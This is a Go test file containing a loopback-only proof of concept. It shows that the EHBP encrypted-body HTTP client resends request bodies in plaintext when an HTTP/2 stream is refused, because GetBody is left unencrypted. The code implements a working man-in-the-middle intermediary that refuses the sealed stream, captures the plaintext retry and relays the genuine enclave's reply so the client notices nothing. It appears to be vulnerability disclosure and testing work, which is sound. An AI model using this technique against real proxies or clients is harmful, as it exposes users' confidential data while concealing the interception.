package client

// Local proof of concept (loopback only): an HTTP/2 RST_STREAM(REFUSED_STREAM)
// from a TLS-terminating intermediary makes the EHBP Go client resend the
// request body in PLAINTEXT.
//
// Root cause: Transport.RoundTrip clones the caller's request, so the clone
// keeps the caller's GetBody, which returns the unencrypted body.
// EncryptRequestWithContext replaces Body with the encrypting reader but leaves
// GetBody unchanged. net/http's HTTP/2 client retries refused streams by
// calling GetBody, so the retry carries the plaintext body. The
// Ehbp-Encapsulated-Key header is still set on that retry.
//
// The intermediary below never has the enclave's HPKE private key. It refuses
// the first (sealed) stream, records the plaintext retry, and then forwards the
// original ciphertext to the genuine enclave and relays the sealed reply.
// The caller therefore sees a normal, successfully decrypted response.

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/encrypted-http-body-protocol/protocol"
)

type pocStream struct {
	hdr  map[string]string
	body bytes.Buffer
}

// pocIntermediary terminates TLS and speaks raw HTTP/2 frames.
type pocIntermediary struct {
	enclaveURL string

	mu       sync.Mutex
	observed []string // every request body the intermediary could read
}

func (m *pocIntermediary) serve(c net.Conn) {
	defer c.Close()
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	streams := map[uint32]*pocStream{}
	var sealed *pocStream
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			s := &pocStream{hdr: map[string]string{}}
			for _, hf := range fields {
				s.hdr[hf.Name] = hf.Value
			}
			streams[f.StreamID] = s
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			s := streams[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		s := streams[ended]
		m.mu.Lock()
		m.observed = append(m.observed, s.body.String())
		m.mu.Unlock()

		if sealed == nil {
			// 1. Refuse the sealed attempt. RFC 9113 §8.7 lets the client retry.
			sealed = s
			fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			continue
		}

		// 2. The retry arrived (in plaintext). Forward the ORIGINAL ciphertext
		//    to the genuine enclave and relay its sealed answer, so the caller
		//    notices nothing.
		up, _ := http.NewRequest(http.MethodPost, m.enclaveURL+s.hdr[":path"], bytes.NewReader(sealed.body.Bytes()))
		up.Header.Set(protocol.EncapsulatedKeyHeader, sealed.hdr[strings.ToLower(protocol.EncapsulatedKeyHeader)])
		resp, err := http.DefaultClient.Do(up)
		if err != nil {
			return
		}
		reply, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		var hb bytes.Buffer
		enc := hpack.NewEncoder(&hb)
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: fmt.Sprint(resp.StatusCode)})
		enc.WriteField(hpack.HeaderField{Name: strings.ToLower(protocol.ResponseNonceHeader), Value: resp.Header.Get(protocol.ResponseNonceHeader)})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hb.Bytes(), EndHeaders: true})
		fr.WriteData(ended, true, reply)
	}
}

func pocCertificate(t *testing.T) (tls.Certificate, *x509.CertPool) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "intermediary"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	leaf, _ := x509.ParseCertificate(der)
	pool := x509.NewCertPool()
	pool.AddCert(leaf)
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key, Leaf: leaf}, pool
}

func TestPoC_RefusedStreamReplaysPlaintextBody(t *testing.T) {
	// The genuine enclave: the only holder of the HPKE private key.
	enclaveID, err := identity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	var enclaveSaw string
	enclave := httptest.NewServer(enclaveID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		enclaveSaw = string(b)
		io.WriteString(w, "enclave answer")
	})))
	defer enclave.Close()

	// The intermediary holds a certificate the client trusts, as any
	// TLS-terminating proxy, CDN, load balancer or gateway in front of the
	// enclave does. It does not hold the HPKE private key.
	cert, pool := pocCertificate(t)
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	mitm := &pocIntermediary{enclaveURL: enclave.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go mitm.serve(c)
		}
	}()

	// Client: the client knows the enclave's public key (as it would after
	// attestation). Its inner transport is a clone of http.DefaultTransport,
	// whose only change is trusting the intermediary's certificate.
	inner := http.DefaultTransport.(*http.Transport).Clone()
	inner.TLSClientConfig = &tls.Config{RootCAs: pool}
	serverIdentity, err := identity.FromPublicKeyHex(enclaveID.MarshalPublicKeyHex())
	if err != nil {
		t.Fatal(err)
	}
	tr, err := NewTransportWithIdentity(serverIdentity, WithHTTPClient(&http.Client{Transport: inner}))
	if err != nil {
		t.Fatal(err)
	}

	const prompt = `{"model":"m","messages":[{"role":"user","content":"CONFIDENTIAL: acquisition target is ACME Corp"}]}`
	resp, err := (&http.Client{Transport: tr}).Post("https://"+ln.Addr().String()+"/v1/chat/completions", "application/json", strings.NewReader(prompt))
	if err != nil {
		t.Fatalf("client request failed: %v", err)
	}
	answer, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		t.Fatalf("reading decrypted response: %v", err)
	}
	t.Logf("client: status=%d proto=%s decrypted answer=%q", resp.StatusCode, resp.Proto, answer)
	t.Logf("enclave decrypted: %q", enclaveSaw)

	mitm.mu.Lock()
	defer mitm.mu.Unlock()
	leaked := false
	for i, b := range mitm.observed {
		shown := b
		if len(shown) > 120 {
			shown = shown[:120] + "..."
		}
		t.Logf("intermediary observed body #%d: %q", i, shown)
		if strings.Contains(b, "ACME Corp") {
			leaked = true
		}
	}
	if !leaked {
		t.Fatal("intermediary did not observe the plaintext prompt (not vulnerable)")
	}
	if string(answer) != "enclave answer" {
		t.Fatalf("unexpected answer %q", answer)
	}
	t.Log("VULNERABLE: the intermediary read the plaintext request body, and the client call succeeded normally")
}
